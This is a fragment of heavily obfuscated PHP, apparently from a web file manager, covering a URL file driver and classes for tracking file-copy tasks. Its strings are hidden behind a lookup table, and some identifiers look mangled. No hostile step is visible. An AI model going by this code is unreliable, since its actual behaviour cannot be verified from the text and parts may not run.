$†ˆ¯°á ? array($_SERVER[Á÷ ­Šë][1412] . rawurlencode($¹éøıê‹)) : array(); $—Â“Ù¦ = $this->link($®ÈŒËÇ“, $Ü€Í‘÷); $this->fileOutLink($—Â“Ù¦); } public function fileOutServer($­èáÛ¢, $²Íìµ˜š = false, $Æ‚ç› = false, $‰Ö½ïÁ÷ = '') { parent::fileOut($­èáÛ¢, $²Íìµ˜š, $Æ‚ç›, $‰Ö½ïÁ÷); } public function fileOutImage($âÔçíàª, $ÌƒÔ–– = 250) { $“Æé±¾š = $this->link($âÔçíàª . $_SERVER[Á÷ ­Šë][1413] . $ÌƒÔ––); $this->fileOutLink($“Æé±¾š); } public function fileOutImageServer($‚¡—İ¬, $½´äè—‹ = 250) { parent::fileOutImage($‚¡—İ¬, $½´äè—‹); } public function hashMd5($Äê™ƒ»²) { $—å åŞ÷ =& $_SERVER[Á÷ ­Šë]; $Ë•†Õá = $this->_objectMeta($Äê™ƒ»²); return isset($Ë•†Õá[$—å åŞ÷[218]]) ? $Ë•†Õá[$—å åŞ÷[218]] : !1; } public function size($¡ŒÛ“™) { $éÙòãù‘ = $this->objectMeta($¡ŒÛ“™); return $éÙòãù‘ ? $éÙòãù‘[$_SERVER[Á÷ ­Šë][88]] : 0; } public function info($ßŒñ™ú¨) { if ($this->isFolder($ßŒñ™ú¨)) { return $this->folderInfo($ßŒñ™ú¨); } else { if ($this->isFile($ßŒñ™ú¨)) { return $this->fileInfo($ßŒñ™ú¨); } } return !1; } public function exist($«õÌ÷ß) { return $this->isFile($«õÌ÷ß) || $this->isFolder($«õÌ÷ß); } public function isFile($–ø‚¯çÜ) { return !$this->isFolder($–ø‚¯çÜ) && $this->objectMeta($–ø‚¯çÜ); } public function isFolder($ûò¸ä£Ê) { return $this->cacheMethod($_SERVER[Á÷ ­Šë][209], $ûò¸ä£Ê); } protected function objectMeta($‚Æòñµƒ) { return $this->cacheMethod($_SERVER[Á÷ ­Šë][210], $‚Æòñµƒ); } protected function _objectMeta($œ¢øæ…Ú) { $½öâÒ±ñ =& $_SERVER[Á÷ ­Šë]; if ($œ¢øæ…Ú == $½öâÒ±ñ[33] || $œ¢øæ…Ú == $½öâÒ±ñ[8]) { return array(); } $œÙŠ¨¥ = $this->ussRequest($œ¢øæ…Ú, $½öâÒ±ñ[1414]); if (!$œÙŠ¨¥[$½öâÒ±ñ[1117]]) { return null; } $¨ÑÍû¢Ø = isset($œÙŠ¨¥[$½öâÒ±ñ[1119]]) ? $œÙŠ¨¥[$½öâÒ±ñ[1119]] : array(); if (!isset($¨ÑÍû¢Ø[$½öâÒ±ñ[1415]])) { return null; } $¹½†°¤ı = array($½öâÒ±ñ[29] => isset($¨ÑÍû¢Ø[$½öâÒ±ñ[1415]]) ? $¨ÑÍû¢Ø[$½öâÒ±ñ[1415]] : null, $½öâÒ±ñ[88] => isset($¨ÑÍû¢Ø[$½öâÒ±ñ[1416]]) ? $¨ÑÍû¢Ø[$½öâÒ±ñ[1416]] : null, $½öâÒ±ñ[218] => isset($¨ÑÍû¢Ø[$½öâÒ±ñ[1417]]) ? $¨ÑÍû¢Ø[$½öâÒ±ñ[1417]] : null, $½öâÒ±ñ[1384] => isset($¨ÑÍû¢Ø[$½öâÒ±ñ[1418]]) ? $¨ÑÍû¢Ø[$½öâÒ±ñ[1418]] : null); $¹½†°¤ı[$½öâÒ±ñ[1385]] = isset($¨ÑÍû¢Ø[$½öâÒ±ñ[1419]]) ? strtotime($¨ÑÍû¢Ø[$½öâÒ±ñ[1419]]) : $¹½†°¤ı[$½öâÒ±ñ[1384]]; return $¹½†°¤ı; } protected function _isFolder($¢—ûĞ…) { $·Šµƒªˆ =& $_SERVER[Á÷ ­Šë]; if ($¢—ûĞ… == $·Šµƒªˆ[33] || $¢—ûĞ… == $·Šµƒªˆ[8]) { return !0; } $Óñ’õ¬£ = $this->_objectMeta($¢—ûĞ…); return isset($Óñ’õ¬£[$·Šµƒªˆ[29]]) && $Óñ’õ¬£[$·Šµƒªˆ[29]] == $·Šµƒªˆ[87] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($Ëşœƒ¶ = false) { } public function exist($ÉÛÙ¡÷ô) { $öÈù¢ƒ = $this->info($ÉÛÙ¡÷ô); return $öÈù¢ƒ[$_SERVER[Á÷ ­Šë][205]]; } public function isFile($Û¢´è¥±) { $‚Ë‰èïŠ = $this->info($Û¢´è¥±); return $‚Ë‰èïŠ[$_SERVER[Á÷ ­Šë][205]]; } public function isFolder($¶î†Å’ª) { return !1; } public function size($­ÌúÈØã) { $Ø±ê…ö = $this->info($­ÌúÈØã); return $Ø±ê…ö[$_SERVER[Á÷ ­Šë][88]]; } public function info($ÁøŞúîÊ) { return $this->infoParse($ÁøŞúîÊ); } public function infoAuth($õÉ–õ ) { return $this->infoParse($õÉ–õ ); } public function infoWithChildren($¤”öÄäÕ) { return $this->infoParse($¤”öÄäÕ); } public function infoFull($ƒ©Œğğ») { return $this->infoParse($ƒ©Œğğ»); } private function infoParse($½ƒ™ —) { $ëí­éæì =& $_SERVER[Á÷ ­Šë]; $’„Û±¶• = $this->header($½ƒ™ —); if (!$’„Û±¶• || !$’„Û±¶•[$ëí­éæì[745]]) { return !1; } $éäŞı÷ª = _get($’„Û±¶•, $ëí­éæì[344], 0); $šÂÂ¢ß = array($ëí­éæì[28] => $’„Û±¶•[$ëí­éæì[28]], $ëí­éæì[86] => $½ƒ™ —, $ëí­éæì[29] => $ëí­éæì[203], $ëí­éæì[88] => intval($éäŞı÷ª), $ëí­éæì[178] => get_path_ext($’„Û±¶•[$ëí­éæì[28]]), $ëí­éæì[1300] => $éäŞı÷ª > 0 && $’„Û±¶•[$ëí­éæì[1420]], $ëí­éæì[1301] => !1); return $šÂÂ¢ß; } private function header($§ÂÈ¦µ) { $¡êêêß =& $_SERVER[Á÷ ­Šë]; if (isset(self::$_cacheHeader[$§ÂÈ¦µ])) { return self::$_cacheHeader[$§ÂÈ¦µ]; } $Æ¡ú¯¥ = isset($GLOBALS[$¡êêêß[1421]]) ? $GLOBALS[$¡êêêß[1421]] : !1; $GLOBALS[$¡êêêß[1421]] = !0; self::$_cacheHeader[$§ÂÈ¦µ] = url_header($§ÂÈ¦µ); $GLOBALS[$¡êêêß[1421]] = $Æ¡ú¯¥; return self::$_cacheHeader[$§ÂÈ¦µ]; } public function hashSimple($­¤ïòÃá, $Å¶‚îüÌ = false) { $ñÙÉĞ‚ú =& $_SERVER[Á÷ ­Šë]; $øªÉ¶¶ = $this->info($­¤ïòÃá); if (!$øªÉ¶¶ || !$øªÉ¶¶[$ñÙÉĞ‚ú[205]]) { return !1; } $ë¬ö¹Õ = $øªÉ¶¶[$ñÙÉĞ‚ú[88]]; $³€œÊš = 200; $¦ç£‡‚ = 50; if ($ë¬ö¹Õ <= $³€œÊš * $¦ç£‡‚) { return md5($this->fileSubstr($­¤ïòÃá, 0, $ë¬ö¹Õ)) . $ë¬ö¹Õ; } $Õİ°ª´Õ = intval($ë¬ö¹Õ / $¦ç£‡‚); $ï‚â = $ñÙÉĞ‚ú[33]; $ƒ»¥¾Ó = timeFloat(); $üÖœÏÓ¬ = 15; for ($¢¥…ÌĞ = 0; $¢¥…ÌĞ < $¦ç£‡‚; $¢¥…ÌĞ++) { if (timeFloat() - $ƒ»¥¾Ó > $üÖœÏÓ¬) { return !1; } $ñù¶ô¬İ = $this->fileSubstr($­¤ïòÃá, $Õİ°ª´Õ * $¢¥…ÌĞ, $³€œÊš); if (!$ñù¶ô¬İ) { return !1; } $ï‚â .= $ñù¶ô¬İ; } $ï‚â .= $this->fileSubstr($­¤ïòÃá, $ë¬ö¹Õ - $³€œÊš, $³€œÊš); return md5($ï‚â) . $ë¬ö¹Õ; } public function getContent($¸Èá°İË) { return $this->fileSubstr($¸Èá°İË); } public function fileSubstr($¼¹à¦şò, $ı«´¬£ğ = 0, $”ñ¦à’¡ = -1) { $£¦šÈ÷ğ =& $_SERVER[Á÷ ­Šë]; $¹¢À¢¤¦ = $this->info($¼¹à¦şò); if (!$¹¢À¢¤¦ || !$¹¢À¢¤¦[$£¦šÈ÷ğ[205]] && $¹¢À¢¤¦[$£¦šÈ÷ğ[88]] > 1024 * 1024 * 10) { return !1; } if ($”ñ¦à’¡ === -1) { $”ñ¦à’¡ = $¹¢À¢¤¦[$£¦šÈ÷ğ[88]]; } if ($”ñ¦à’¡ == 0) { return $£¦šÈ÷ğ[33]; } $ÅÙòÆîÂ = array($£¦šÈ÷ğ[1422] . $ı«´¬£ğ . $£¦šÈ÷ğ[779] . ($ı«´¬£ğ + $”ñ¦à’¡ - 1)); $ñ“òÀë = url_request($¼¹à¦şò, $£¦šÈ÷ğ[238], !1, $ÅÙòÆîÂ, !1, !1, 1); return $ñ“òÀë[$£¦šÈ÷ğ[1119]] ? $ñ“òÀë[$£¦šÈ÷ğ[1119]] : $£¦šÈ÷ğ[33]; } public function download($¬ÂëÁ‰½, $ÓÚœ±Òõ) { Downloader::start($¬ÂëÁ‰½, $ÓÚœ±Òõ); return $ÓÚœ±Òõ; } } goto eÙµç÷Ñç‰; e¹øâ±¥ĞÖ: class Task { const STATYS_STOP = "\163\x74\x6f\x70"; const STATYS_RUNNING = "\x72\165\156\156\x69\156\147"; const STATYS_KILL = "\x6b\151\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($Ôìë­Á°, $ï†ˆŞ = '', $˜Š¸ğ¼Ì = 0, $ê˜º§Ôé = '') { $”¨¡ö³ =& $_SERVER[Á÷ ­Šë]; if (self::get($Ôìë­Á°)) { return; } $this->task = array($”¨¡ö³[404] => $Ôìë­Á°, $”¨¡ö³[1574] => USER_ID, $”¨¡ö³[1474] => $ê˜º§Ôé, $”¨¡ö³[29] => $ï†ˆŞ, $”¨¡ö³[1057] => $”¨¡ö³[33], $”¨¡ö³[1055] => $˜Š¸ğ¼Ì, $”¨¡ö³[1575] => 0, $”¨¡ö³[1576] => 0, $”¨¡ö³[1577] => 0, $”¨¡ö³[784] => timeFloat(), $”¨¡ö³[783] => 0, $”¨¡ö³[1578] => 0, $”¨¡ö³[1579] => 0, $”¨¡ö³[1580] => 0, $”¨¡ö³[745] => $”¨¡ö³[1534]); $GLOBALS[$”¨¡ö³[1581]] = 1; Hook::bind($”¨¡ö³[1537], array($this, $”¨¡ö³[1582])); Hook::bind($”¨¡ö³[1583], array($this, $”¨¡ö³[1584])); $this->startAfter(); Hook::trigger($”¨¡ö³[1585], $this->task); $this->task[$”¨¡ö³[1578]] = timeFloat(); } public function end() { $Òõğòšˆ =& $_SERVER[Á÷ ­Šë]; if (!$this->task) { return; } if ($this->task[$Òõğòšˆ[1578]]) { self::valueSet($this->task[$Òõğòšˆ[404]], !1); } $µ¾µÓµÉ = timeFloat() - $this->task[$Òõğòšˆ[784]]; self::log($Òõğòšˆ[1586] . $this->task[$Òõğòšˆ[404]] . $Òõğòšˆ[1587] . $µ¾µÓµÉ . $Òõğòšˆ[1588]); Hook::unbind($Òõğòšˆ[1537], array($this, $Òõğòšˆ[1582])); Hook::unbind($Òõğòšˆ[1583], array($this, $Òõğòšˆ[1584])); $this->endAfter(); $this->task = !1; } public function update($¬åÖ÷¿× = 0, $ºï»‚† = false) { $ŸĞ£ò‘à =& $_SERVER[Á÷ ­Šë]; $ìî³½¶š =& $this->task; if (!$ìî³½¶š) { return; } $ìî³½¶š[$ŸĞ£ò‘à[1575]] += $¬åÖ÷¿×; $ìî³½¶š[$ŸĞ£ò‘à[783]] = timeFloat(); if ($ìî³½¶š[$ŸĞ£ò‘à[1055]]) { if ($ìî³½¶š[$ŸĞ£ò‘à[1055]] < $ìî³½¶š[$ŸĞ£ò‘à[1575]]) { $ìî³½¶š[$ŸĞ£ò‘à[1055]] = $ìî³½¶š[$ŸĞ£ò‘à[1575]]; } $­Óû”ŸŒ = timeFloat() - $ìî³½¶š[$ŸĞ£ò‘à[784]] - $ìî³½¶š[$ŸĞ£ò‘à[1579]]; $ìî³½¶š[$ŸĞ£ò‘à[1576]] = $ìî³½¶š[$ŸĞ£ò‘à[1575]] / $ìî³½¶š[$ŸĞ£ò‘à[1055]]; $ìî³½¶š[$ŸĞ£ò‘à[1577]] = $ìî³½¶š[$ŸĞ£ò‘à[1575]] / $­Óû”ŸŒ; if ($ìî³½¶š[$ŸĞ£ò‘à[1576]] > 0) { $ìî³½¶š[$ŸĞ£ò‘à[1580]] = $­Óû”ŸŒ * (1 - $ìî³½¶š[$ŸĞ£ò‘à[1576]]) / $ìî³½¶š[$ŸĞ£ò‘à[1576]]; } $ìî³½¶š[$ŸĞ£ò‘à[1580]] = $ìî³½¶š[$ŸĞ£ò‘à[1580]] <= 0 ? 0 : $ìî³½¶š[$ŸĞ£ò‘à[1580]]; } $this->updateAfter(); $­ÑŠæÁ§ = 0.2; if (timeFloat() - $ìî³½¶š[$ŸĞ£ò‘à[1578]] < $­ÑŠæÁ§ && !$ºï»‚†) { return; } $‘¿¡‡Î = self::get($ìî³½¶š[$ŸĞ£ò‘à[404]]); $ï‚»„»” = $‘¿¡‡Î[$ŸĞ£ò‘à[745]]; if ($ï‚»„»” == self::STATYS_KILL) { $ÛüÛÀöÓ = array($ŸĞ£ò‘à[1589] => LNG($ŸĞ£ò‘à[1590]), $ŸĞ£ò‘à[1117] => !1); Cache::set($ŸĞ£ò‘à[1591] . $this->task[$ŸĞ£ò‘à[404]], $ÛüÛÀöÓ, 30); $this->onKill(); $this->end(); die; } else { if ($ï‚»„»” == self::STATYS_STOP) { $ğÍªŠàµ = 2; $‘¿¡‡Î[$ŸĞ£ò‘à[1579]] += $ğÍªŠàµ; self::valueSet($ìî³½¶š[$ŸĞ£ò‘à[404]], $‘¿¡‡Î); sleep($ğÍªŠàµ); $this->update(); return; } } $ìî³½¶š[$ŸĞ£ò‘à[745]] = $ï‚»„»” ? $ï‚»„»” : $ìî³½¶š[$ŸĞ£ò‘à[745]]; $ìî³½¶š[$ŸĞ£ò‘à[1579]] = $‘¿¡‡Î[$ŸĞ£ò‘à[1579]] ? $‘¿¡‡Î[$ŸĞ£ò‘à[1579]] : 0; $ìî³½¶š[$ŸĞ£ò‘à[1578]] = timeFloat(); Hook::trigger($ŸĞ£ò‘à[1592], $ìî³½¶š); self::valueSet($ìî³½¶š[$ŸĞ£ò‘à[404]], $ìî³½¶š); } public function onKillSet($ªİ¶©Øè, $ŞÂÅÈƒ¥ = array()) { $this->onKillCall = array($ªİ¶©Øè, $ŞÂÅÈƒ¥); } public function onKill() { $½şœ­ˆ¢ =& $_SERVER[Á÷ ­Šë]; self::log($½şœ­ˆ¢[1586] . $this->task[$½şœ­ˆ¢[404]] . $½şœ­ˆ¢[1593]); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($È·¹—°İ) { $›ÄøĞßÀ =& $_SERVER[Á÷ ­Šë]; Cache::set($›ÄøĞßÀ[1591] . $this->task[$›ÄøĞßÀ[404]], $È·¹—°İ, 60); return $È·¹—°İ; } public static function get($Ùü’Ì—) { $¢ù‡Óê =& $_SERVER[Á÷ ­Šë]; $ÁØó¶ó¥ = self::valueGet($Ùü’Ì—); if (is_array($ÁØó¶ó¥) && $ÁØó¶ó¥[$¢ù‡Óê[1594]]) { $ÚÄ“å§ = ActionApply($ÁØó¶ó¥[$¢ù‡Óê[1594]], array($ÁØó¶ó¥)); $ÁØó¶ó¥ = is_array($ÚÄ“å§) ? $ÚÄ“å§ : $ÁØó¶ó¥; } return $ÁØó¶ó¥; } public static function listData() { $à¹Àš¥– = self::valueGet(); return array_sort_by($à¹Àš¥–, $_SERVER[Á÷ ­Šë][784], !0); } public static function kill($òÑİ×±Û) { return self::changeStatus($òÑİ×±Û, self::STATYS_KILL); } public static function stop($íïŸÑŞ) { return self::changeStatus($íïŸÑŞ, self::STATYS_STOP); } public static function restart($¶ÌîèÆ) { return self::changeStatus($¶ÌîèÆ, self::STATYS_RUNNING); } public static function killAll() { $»Æà÷ã =& $_SERVER[Á÷ ­Šë]; $ÉÌ§Óàğ = self::listData(); foreach ($ÉÌ§Óàğ as $—ä¸Ëú) { self::kill($—ä¸Ëú[$»Æà÷ã[404]]); } sleep(2); foreach ($ÉÌ§Óàğ as $—ä¸Ëú) { self::valueSet($—ä¸Ëú[$»Æà÷ã[404]], !1); } } private static function changeStatus($Ø‰ËÄ—Í, $›ÂÜ•) { $ıî”§ï· =& $_SERVER[Á÷ ­Šë]; $Ğ¶’ß¨ = self::valueGet($Ø‰ËÄ—Í); if (!$Ğ¶’ß¨) { return !1; } $Ğ¶’ß¨[$ıî”§ï·[745]] = $›ÂÜ•; self::valueSet($Ø‰ËÄ—Í, $Ğ¶’ß¨); self::log($ıî”§ï·[1595] . $Ğ¶’ß¨[$ıî”§ï·[404]] . $ıî”§ï·[1596] . $›ÂÜ•); return !0; } public static function valueGet($ò®ù¼å­ = false) { $¯ªí¾íó =& $_SERVER[Á÷ ­Šë]; if ($ò®ù¼å­) { $š­»õÍ = Model($¯ªí¾íó[449])->where(array($¯ªí¾íó[103] => $ò®ù¼å­, $¯ªí¾íó[29] => $¯ªí¾íó[1597]))->find(); return $š­»õÍ ? json_decode($š­»õÍ[$¯ªí¾íó[381]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($˜ÇÁ¼åÏ = false) { $ë¬ó¥åá =& $_SERVER[Á÷ ­Šë]; $éÛ™­áº = array($ë¬ó¥åá[29] => $ë¬ó¥åá[1597]); if ($˜ÇÁ¼åÏ) { $éÛ™­áº[$ë¬ó¥åá[1574]] = $˜ÇÁ¼åÏ; } $»’–ıŸÈ = Model($ë¬ó¥åá[449])->where($éÛ™­áº)->select(); $»’–ıŸÈ = $»’–ıŸÈ ? $»’–ıŸÈ : array(); foreach ($»’–ıŸÈ as $Œâúäßˆ => $ÒÓ¢æñõ) { $»’–ıŸÈ[$Œâúäßˆ] = json_decode($ÒÓ¢æñõ[$ë¬ó¥åá[381]], !0); } return $»’–ıŸÈ; } public static function valueSet($ÀÀáÑé›, $ã¥¹û›) { $ú©Ó÷¹Ì =& $_SERVER[Á÷ ­Šë]; if (!$ã¥¹û›) { return Model($ú©Ó÷¹Ì[449])->where(array($ú©Ó÷¹Ì[103] => $ÀÀáÑé›, $ú©Ó÷¹Ì[29] => $ú©Ó÷¹Ì[1597]))->delete(); } $·±ûÂ½± = json_encode($ã¥¹û›); if (!$·±ûÂ½±) { ob_start(); var_dump($ã¥¹û›); $ÛÕòŞ÷ = ob_get_clean(); self::log($ú©Ó÷¹Ì[1598] . json_encode_force($ÛÕòŞ÷)); } if (!$ÀÀáÑé› || !$ã¥¹û›[$ú©Ó÷¹Ì[404]]) { return !1; } $ìæ¿—ù = array($ú©Ó÷¹Ì[29] => $ú©Ó÷¹Ì[1597], $ú©Ó÷¹Ì[1574] => USER_ID, $ú©Ó÷¹Ì[103] => $ÀÀáÑé›, $ú©Ó÷¹Ì[381] => $·±ûÂ½±); $’ñË¨„ = $ú©Ó÷¹Ì[1599]; CacheLock::lock($’ñË¨„); Model($ú©Ó÷¹Ì[449])->add($ìæ¿—ù, array(), !0); CacheLock::unlock($’ñË¨„); } public static function log($ª³ËŒëĞ) { if (!GLOBAL_DEBUG) { return; } write_log($ª³ËŒëĞ, $_SERVER[Á÷ ­Šë][1600]); } } class TaskFileTransfer extends Task { protected function startAfter() { $°Ï¹®Îê =& $_SERVER[Á÷ ­Šë]; $èí„À¡ø =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($°Ï¹®Îê[1601], array($this, $°Ï¹®Îê[1602])); Hook::bind($°Ï¹®Îê[1141], array($this, $°Ï¹®Îê[1603])); Hook::bind($°Ï¹®Îê[1604], array($this, $°Ï¹®Îê[1605])); Hook::bind($°Ï¹®Îê[602], array($this, $°Ï¹®Îê[1606])); Hook::bind($°Ï¹®Îê[603], array($this, $°Ï¹®Îê[1607])); Hook::bind($°Ï¹®Îê[605], array($this, $°Ï¹®Îê[1608])); Hook::bind($°Ï¹®Îê[606], array($this, $°Ï¹®Îê[1608])); Hook::bind($°Ï¹®Îê[572], array($this, $°Ï¹®Îê[1609])); Hook::bind($°Ï¹®Îê[569], array($this, $°Ï¹®Îê[1609])); Hook::bind($°Ï¹®Îê[574], array($this, $°Ï¹®Îê[1609])); Hook::bind($°Ï¹®Îê[576], array($this, $°Ï¹®Îê[1609])); Hook::bind($°Ï¹®Îê[578], array($this, $°Ï¹®Îê[1609])); Hook::bind($°Ï¹®Îê[1610], array($this, $°Ï¹®Îê[1611])); Hook::bind($°Ï¹®Îê[595], array($this, $°Ï¹®Îê[1612])); $this->sourceModelCopyFlag = !1; Hook::bind($°Ï¹®Îê[1613], array($this, $°Ï¹®Îê[1614])); Hook::bind($°Ï¹®Îê[1615], array($this, $°Ï¹®Îê[1616])); Hook::bind($°Ï¹®Îê[1617], array($this, $°Ï¹®Îê[1618])); $èí„À¡ø[$°Ï¹®Îê[1619]] = LNG($°Ï¹®Îê[1620]); $èí„À¡ø[$°Ï¹®Îê[1621]] = 0; $èí„À¡ø[$°Ï¹®Îê[1622]] = 0; $èí„À¡ø[$°Ï¹®Îê[1057]] = $°Ï¹®Îê[33]; $èí„À¡ø[$°Ï¹®Îê[1623]] = $°Ï¹®Îê[33]; $èí„À¡ø[$°Ï¹®Îê[1624]] = 0; $èí„À¡ø[$°Ï¹®Îê[1625]] = 0; $èí„À¡ø[$°Ï¹®Îê[1626]] = 0; if (!$èí„À¡ø[$°Ï¹®Îê[1474]]) { $èí„À¡ø[$°Ï¹®Îê[1474]] = LNG($°Ï¹®Îê[1627]); } } protected function endAfter() { $·ı½õû— =& $_SERVER[Á÷ ­Šë]; Hook::unbind($·ı½õû—[1601], array($this, $·ı½õû—[1602])); Hook::unbind($·ı½õû—[1141], array($this, $·ı½õû—[1603])); Hook::unbind($·ı½õû—[1604], array($this, $·ı½õû—[1605])); Hook::unbind($·ı½õû—[602], array($this, $·ı½õû—[1606])); Hook::unbind($·ı½õû—[603], array($this, $·ı½õû—[1607])); Hook::unbind($·ı½õû—[605], array($this, $·ı½õû—[1608])); Hook::unbind($·ı½õû—[606], array($this, $·ı½õû—[1608])); Hook::unbind($·ı½õû—[572], array($this, $·ı½õû—[1609])); Hook::unbind($·ı½õû—[569], array($this, $·ı½õû—[1609])); Hook::unbind($·ı½õû—[574], array($this, $·ı½õû—[1609])); Hook::unbind($·ı½õû—[576], array($this, $·ı½õû—[1609])); Hook::unbind($·ı½õû—[578], array($this, $·ı½õû—[1609])); Hook::unbind($·ı½õû—[1610], array($this, $·ı½õû—[1611])); Hook::unbind($·ı½õû—[595], array($this, $·ı½õû—[1612])); Hook::unbind($·ı½õû—[1613], array($this, $·ı½õû—[1614])); Hook::unbind($·ı½õû—[1615], array($this, $·ı½õû—[1616])); Hook::unbind($·ı½õû—[1617], array($this, $·ı½õû—[1618])); } public function copyMoveStart($Åˆ÷øÖö, $ØÁÃîÓ‡, $¥¼¯—, $«ó¯¸Ÿš) { $öíÕ† à =& $_SERVER[Á÷ ­Šë]; self::log($öíÕ† à[1628] . $ØÁÃîÓ‡ . $öíÕ† à[77] . $«ó¯¸Ÿš); $Ô³Ÿ˜ïè = rtrim(TEMP_FILES, $öíÕ† à[8]); if (substr($ØÁÃîÓ‡, 0, strlen($Ô³Ÿ˜ïè)) == $Ô³Ÿ˜ïè) { return; } if (substr($«ó¯¸Ÿš, 0, strlen($Ô³Ÿ˜ïè)) == $Ô³Ÿ˜ïè) { return; } $İ‚´×İå =& $this->task; $İ‚´×İå[$öíÕ† à[1629]] = KodIO::transferType($Åˆ÷øÖö, $¥¼¯—); $this->update(); } public function updateAfter() { $®¾É¡¶‚ =& $_SERVER[Á÷ ­Šë]; $Àü­‰•© =& $this->task; if (!$Àü­‰•©[$®¾É¡¶‚[758]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($Àü­‰•©[$®¾É¡¶‚[1629]] == $®¾É¡¶‚[1226]) { return; } self::updateTask($Àü­‰•©); } private static function updateTask(&$ìàÑÍØ) { $š® ” ´ =& $_SERVER[Á÷ ­Šë]; if ($ìàÑÍØ[$š® ” ´[1629]] == $š® ” ´[1125] || $ìàÑÍØ[$š® ” ´[1629]] == $š® ” ´[117]) { if ($ìàÑÍØ[$š® ” ´[1623]]) { $ìàÑÍØ[$š® ” ´[1626]] = $ìàÑÍØ[$š® ” ´[1625]] + $ìàÑÍØ[$š® ” ´[1622]]; } } else { if ($ìàÑÍØ[$š® ” ´[1629]] == $š® ” ´[1227]) { if ($ìàÑÍØ[$š® ” ´[1623]] == $š® ” ´[1125]) { $ìàÑÍØ[$š® ” ´[1626]] = $ìàÑÍØ[$š® ” ´[1625]] + $ìàÑÍØ[$š® ” ´[1622]] * 0.5; } else { if ($ìàÑÍØ[$š® ” ´[1623]] == $š® ” ´[117]) { $ìàÑÍØ[$š® ” ´[1626]] = $ìàÑÍØ[$š® ” ´[1625]] + $ìàÑÍØ[$š® ” ´[1621]] * 0.5 + $ìàÑÍØ[$š® ” ´[1622]] * 0.5; } } } } $ìàÑÍØ[$š® ” ´[1576]] = $ìàÑÍØ[$š® ” ´[1626]] / $ìàÑÍØ[$š® ” ´[758]]; if ($ìàÑÍØ[$š® ” ´[1576]] > 0) { $ıê¡ § = timeFloat() - $ìàÑÍØ[$š® ” ´[784]] - $ìàÑÍØ[$š® ” ´[1579]]; $ìàÑÍØ[$š® ” ´[1580]] = $ıê¡ § * (1 - $ìàÑÍØ[$š® ” ´[1576]]) / $ìàÑÍØ[$š® ” ´[1576]]; } } public function addPath($Û÷•³˜Õ) { $ç”‡Œ£º =& $_SERVER[Á÷ ­Šë]; if (!$Û÷•³˜Õ) { return; } $•×ö°ˆ¦ =& $this->task; $Š­†‰¼Š = IO::infoWithChildren($Û÷•³˜Õ); $š¬­ÃŸŒ = $•×ö°ˆ¦[$ç”‡Œ£º[1630]] ? $•×ö°ˆ¦[$ç”‡Œ£º[1630]][$ç”‡Œ£º[1631]] : 0; $•×ö°ˆ¦[$ç”‡Œ£º[1630]] = array($ç”‡Œ£º[1631] => $š¬­ÃŸŒ + 1, $ç”‡Œ£º[425] => $Š­†‰¼Š[$ç”‡Œ£º[28]], $ç”‡Œ£º[86] => $Š­†‰¼Š[$ç”‡Œ£º[86]], $ç”‡Œ£º[523] => $Š­†‰¼Š[$ç”‡Œ£º[523]] ? $Š­†‰¼Š[$ç”‡Œ£º[523]] : $Š­†‰¼Š[$ç”‡Œ£º[86]]); if ($Š­†‰¼Š[$ç”‡Œ£º[29]] == $ç”‡Œ£º[203]) { $•×ö°ˆ¦[$ç”‡Œ£º[1055]] += 1; } else { $•×ö°ˆ¦[$ç”‡Œ£º[1055]] += $Š­†‰¼Š[$ç”‡Œ£º[91]][$ç”‡Œ£º[89]]; if ($Š­†‰¼Š[$ç”‡Œ£º[407]]) { $•×ö°ˆ¦[$ç”‡Œ£º[1055]] += $Š­†‰¼Š[$ç”‡Œ£º[91]][$ç”‡Œ£º[90]] + 1; } } $•×ö°ˆ¦[$ç”‡Œ£º[758]] += $Š­†‰¼Š[$ç”‡Œ£º[88]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($Ï¥ü¦ÅÊ) { $ù¡šÆÃë =& $_SERVER[Á÷ ­Šë]; $ºé«‚êÒ =& $this->task; $ºé«‚êÒ[$ù¡šÆÃë[1619]] = $Ï¥ü¦ÅÊ[$ù¡šÆÃë[28]]; $ºé«‚êÒ[$ù¡šÆÃë[1057]] = $Ï¥ü¦ÅÊ[$ù¡šÆÃë[28]]; $this->update(); } public function copyFileStart($ºŞ˜ñèİ, $º©‡Ä³ş, $Ç‚›ª æ, $§¨ï²Â¡, $Òùª‚„ø, $Ú‰—ÇÈ) { $‹îÚ—¾´ =& $_SERVER[Á÷ ­Šë]; $È¶¾ÜìĞ = $Òùª‚„ø; if ($È¶¾ÜìĞ == $GLOBALS[$‹îÚ—¾´[1632]]) { $È¶¾ÜìĞ = $GLOBALS[$‹îÚ—¾´[1633]]; } $GLOBALS[$‹îÚ—¾´[1633]] = $Òùª‚„ø; $GLOBALS[$‹îÚ—¾´[1632]] = $Ú‰—ÇÈ; $ÙèÒ¢Ü• =& $this->task; $ÙèÒ¢Ü•[$‹îÚ—¾´[1619]] = $È¶¾ÜìĞ; $ÙèÒ¢Ü•[$‹îÚ—¾´[1621]] = (int) $ºŞ˜ñèİ->size($º©‡Ä³ş); $ÙèÒ¢Ü•[$‹îÚ—¾´[1622]] = 0; $ÙèÒ¢Ü•[$‹îÚ—¾´[1057]] = $‹îÚ—¾´[33]; $ÙèÒ¢Ü•[$‹îÚ—¾´[1623]] = $‹îÚ—¾´[33]; $ÙèÒ¢Ü•[$‹îÚ—¾´[1624]] = 0; $ÑšÄæã© = $ÙèÒ¢Ü•[$‹îÚ—¾´[1621]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($ÙèÒ¢Ü•[$‹îÚ—¾´[404]] . $‹îÚ—¾´[1634]); if ($ÑšÄæã© && file_exists(get_path_father($§¨ï²Â¡))) { Cache::set($ÙèÒ¢Ü•[$‹îÚ—¾´[404]] . $‹îÚ—¾´[1634], $§¨ï²Â¡); $ÙèÒ¢Ü•[$‹îÚ—¾´[1594]] = array($‹îÚ—¾´[1635], $‹îÚ—¾´[1636]); } $this->update(0, $ÑšÄæã©); } public static function updateCopyLocalFileSize($š“†âÑØ) { $şĞ®†Âã =& $_SERVER[Á÷ ­Šë]; 